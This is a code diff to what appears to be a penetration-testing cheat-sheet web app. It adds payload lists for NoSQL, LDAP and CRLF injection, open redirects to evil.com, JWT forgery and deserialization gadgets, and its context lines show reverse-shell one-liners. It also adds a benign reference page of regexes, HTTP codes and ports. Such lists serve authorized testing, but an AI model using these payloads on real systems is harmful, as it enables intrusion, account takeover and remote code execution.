@@ -59,6 +59,32 @@ export const PAYLOADS = {
     "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
     "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream()...\"",
   ],
+  "NoSQL injection": [
+    "{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}", "'||'1'=='1", "{\"$where\":\"sleep(5000)\"}",
+    "admin'||''=='", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "username[$ne]=x&password[$ne]=y",
+  ],
+  "LDAP injection": ["*", "*)(uid=*))(|(uid=*", "*)(|(objectClass=*", "admin)(&)", "*)(mail=*", "*))%00"],
+  "CRLF / header injection": [
+    "%0d%0aSet-Cookie:sessid=hacked", "%0d%0aLocation:https://evil.com", "%0d%0a%0d%0a<script>alert(1)</script>",
+    "test%0d%0aContent-Length:0%0d%0a%0d%0a", "%E5%98%8D%E5%98%8ASet-Cookie:x=1",
+  ],
+  "Open redirect": [
+    "//evil.com", "https://evil.com", "/\\/evil.com", "https:evil.com", "//google.com%2f%2f@evil.com",
+    "?next=//evil.com", "?url=javascript:alert(document.domain)", "////evil.com",
+  ],
+  "JWT attacks": [
+    "alg:none  { \"alg\":\"none\",\"typ\":\"JWT\" }  (strip signature)",
+    "RS256->HS256 confusion: sign HS256 with the RS256 public key",
+    "weak HS256 secret: hashcat -m 16500 token.jwt rockyou.txt",
+    "kid path traversal: \"kid\":\"../../../../dev/null\"",
+    "jku / x5u pointing to an attacker-hosted JWKS",
+  ],
+  "Deserialization": [
+    "Java: java -jar ysoserial.jar CommonsCollections1 'id' | base64",
+    "PHP: phpggc Monolog/RCE1 system id", "Python pickle: __reduce__ -> (os.system,('id',))",
+    ".NET: ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c \"id\"",
+    "Node: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()",
+  ],
 };
 
 export const SNIPPETS = {
@@ -162,4 +188,57 @@ export function renderApiKeys(main) {
     const m = main.querySelector("#akMsg"); m.textContent = "saved to this browser"; setTimeout(() => (m.textContent = ""), 1600);
   };
   main.querySelector("#akShow").onclick = () => main.querySelectorAll("[data-key]").forEach((i) => (i.type = i.type === "password" ? "text" : "password"));
+}
+
+// --- Reference library: regex, HTTP status codes, common ports ---
+const REGEX = [
+  ["Email", "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"],
+  ["IPv4", "\\b(?:(?:25[0-5]|2[0-4]\\d|1?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1?\\d?\\d)\\b"],
+  ["IPv6", "(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}"],
+  ["URL", "https?://[^\\s\"'<>)]+"],
+  ["MAC address", "(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}"],
+  ["UUID v4", "[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}"],
+  ["MD5 hash", "\\b[a-f0-9]{32}\\b"],
+  ["SHA-1 hash", "\\b[a-f0-9]{40}\\b"],
+  ["SHA-256 hash", "\\b[a-f0-9]{64}\\b"],
+  ["JWT", "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"],
+  ["Private key block", "-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"],
+  ["AWS access key", "AKIA[0-9A-Z]{16}"],
+  ["Slack token", "xox[baprs]-[0-9A-Za-z-]{10,}"],
+  ["Google API key", "AIza[0-9A-Za-z_-]{35}"],
+  ["Bearer token header", "Authorization:\\s*Bearer\\s+[A-Za-z0-9._-]+"],
+  ["Credit card", "\\b(?:4\\d{3}|5[1-5]\\d{2}|3[47]\\d{2}|6011)[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b"],
+  ["Date YYYY-MM-DD", "\\b\\d{4}-(?:0[1-9]|1[0-2])-(?:0[1-9]|[12]\\d|3[01])\\b"],
+  ["Hex color", "#[0-9a-fA-F]{6}\\b"],
+  ["Domain name", "(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,}"],
+  ["Windows path", "[A-Za-z]:\\\\(?:[^\\\\/:*?\"<>|\\r\\n]+\\\\?)*"],
+];
+const HTTP_STATUS = [
+  ["200", "OK"], ["201", "Created"], ["204", "No Content"], ["206", "Partial Content"],
+  ["301", "Moved Permanently"], ["302", "Found"], ["304", "Not Modified"], ["307", "Temporary Redirect"], ["308", "Permanent Redirect"],
+  ["400", "Bad Request"], ["401", "Unauthorized"], ["403", "Forbidden"], ["404", "Not Found"], ["405", "Method Not Allowed"],
+  ["407", "Proxy Auth Required"], ["408", "Request Timeout"], ["409", "Conflict"], ["413", "Payload Too Large"], ["418", "I'm a teapot"],
+  ["422", "Unprocessable Entity"], ["429", "Too Many Requests"], ["431", "Header Fields Too Large"],
+  ["500", "Internal Server Error"], ["501", "Not Implemented"], ["502", "Bad Gateway"], ["503", "Service Unavailable"], ["504", "Gateway Timeout"],
+];
+const PORTS = [
+  ["21", "FTP"], ["22", "SSH"], ["23", "Telnet"], ["25", "SMTP"], ["53", "DNS"], ["80", "HTTP"], ["110", "POP3"],
+  ["135", "MS RPC"], ["139", "NetBIOS"], ["143", "IMAP"], ["389", "LDAP"], ["443", "HTTPS"], ["445", "SMB"],
+  ["1433", "MSSQL"], ["1521", "Oracle"], ["3306", "MySQL"], ["3389", "RDP"], ["5432", "PostgreSQL"],
+  ["5900", "VNC"], ["6379", "Redis"], ["8080", "HTTP-alt"], ["9200", "Elasticsearch"], ["27017", "MongoDB"],
+];
+export function renderRefs(main) {
+  const badge = (code) => { const n = +code; const cls = n < 300 ? "ok" : n < 400 ? "" : n < 500 ? "warn" : "bad"; return `<span class="ref-code ${cls}">${esc(code)}</span>`; };
+  main.innerHTML = `
+    <h1 class="pg-h1">References</h1>
+    <p class="muted pg-sub">Fast lookups you reach for constantly &mdash; regex patterns, HTTP status codes, and common ports.</p>
+    <div class="ref-grid">
+      <div class="cs-card"><div class="cs-head"><h3>Regex patterns</h3><span class="chip">${REGEX.length}</span></div>
+        ${REGEX.map(([lbl, rx]) => copyRow(lbl, rx)).join("")}</div>
+      <div class="cs-card"><div class="cs-head"><h3>HTTP status codes</h3><span class="chip">${HTTP_STATUS.length}</span></div>
+        ${HTTP_STATUS.map(([c, t]) => `<div class="ref-row">${badge(c)}<span>${esc(t)}</span></div>`).join("")}</div>
+      <div class="cs-card"><div class="cs-head"><h3>Common ports</h3><span class="chip">${PORTS.length}</span></div>
+        ${PORTS.map(([p, s]) => `<div class="ref-row"><span class="ref-code">${esc(p)}</span><span>${esc(s)}</span></div>`).join("")}</div>
+    </div>`;
+  wireCopy(main);
 }
